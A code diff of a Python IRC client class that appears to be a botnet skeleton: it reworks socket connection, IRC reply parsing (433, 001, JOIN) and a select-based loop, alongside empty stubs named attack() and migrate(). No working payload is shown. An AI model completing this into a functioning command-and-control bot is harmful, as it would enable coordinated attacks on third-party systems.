@@ -22,7 +22,6 @@ class Bot:
     NICK_COUNT = 0
 
     MESSAGES = {}
-    OUTPUTS = []
     INPUTS = []
 
     CONNECTED_SOCKET = False
@@ -60,10 +59,12 @@ class Bot:
 
         # setup the client socket
         try:
+            # connect to server
             self.BOT_SOCKET = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-
             self.BOT_SOCKET.connect((self.HOSTNAME, self.PORT))
-            self.BOT_SOCKET.settimeout(5)
+
+            self.INPUTS.append(self.BOT_SOCKET)
+
             self.CONNECTED_SOCKET = True
 
         except Exception as e:
@@ -76,33 +77,42 @@ class Bot:
     def send_msg(self, data):
         """ Function to send message to a socket """
         
-        print("Sending:" + data)
+        print("Sending: " + data)
 
         try:
-            self.BOT_SOCKET.settimeout(5)
             self.BOT_SOCKET.send(data.encode())
+
         except Exception as e:
             print(str(e))
 
 
     def check_data(self, data):
         """ Check the data """
+        data = data.split("\r\n")
 
-        # check if bot logged onto IRC server
-        if "Nickname is already in use" in data:
-            self.NICK_COUNT += 1
-            self.CONNECTED_SERVER = False
+
+        for line in data:
             
-        # join server successfully
-        elif data.split()[1] == "001":
-            self.BOT_COUNT += 1
-            self.CONNECTED_SERVER = True
-            print(str(self.BOT_COUNT))
+            line = line.split()
 
-        # join channel successfully
-        elif "JOIN :#" + self.CHANNEL:
-            print("Joined channel")
-            self.JOINED = True
+            if len(line) < 2:
+                continue
+
+            # check if bot logged onto IRC server
+            if line[1] == "433":
+                self.NICK_COUNT += 1
+                self.CONNECTED_SERVER = False
+                
+            # join server successfully
+            elif line[1] == "001":
+                self.BOT_COUNT += 1
+                self.CONNECTED_SERVER = True
+                print(str(self.BOT_COUNT))
+
+            # join channel successfully
+            elif line[1] == "JOIN":
+                print("Joined channel")
+                self.JOINED = True
 
 
     def close_socket(self, sckt):
@@ -148,6 +158,7 @@ class Bot:
         except Exception as e:
             print(str(e))
 
+
     def attack(self):
         """ Perform an attack """
 
@@ -158,6 +169,7 @@ class Bot:
         """ Migrate to a different IRC server """
 
         return
+
 
     def shutdown(self):
         """ Shutdown the bot """
@@ -172,29 +184,29 @@ class Bot:
 
 
     def run(self):
-        """ Run the bot """
-        
         while True:
-            # join the server
-            # if not self.CONNECTED_SERVER and self.CONNECTED_SOCKET:
-            self.handshake()
-            print("handshake done")
+            readable, writable, exceptable = select.select(self.INPUTS, self.INPUTS, [])
 
-            # join the channel
-            # if not self.JOINED and self.CONNECTED_SERVER:
-            self.join()
+            for socket in readable:
 
-            self.BOT_SOCKET.settimeout(5)
-            data = self.BOT_SOCKET.recv(1024)
+                socket.settimeout(5)
+                data = socket.recv(1024)
+                socket.settimeout(None)
 
-            if data:
-                data = data.decode("utf-8")
-                print(data)
-                self.check_data(data)
+                # there is data to be received
+                if data:
 
-            else:
-                self.CONNECTED_SOCKET = False
+                    # check the data
+                    data = data.decode("utf-8")
+                    print(data)
+                    self.check_data(data)
 
+                    if not self.CONNECTED_SERVER:
+                        self.handshake()
+
+                # connection was closed
+                else:
+                    self.CONNECTED_SOCKET = False
 
 def run():
     """ Run the client """
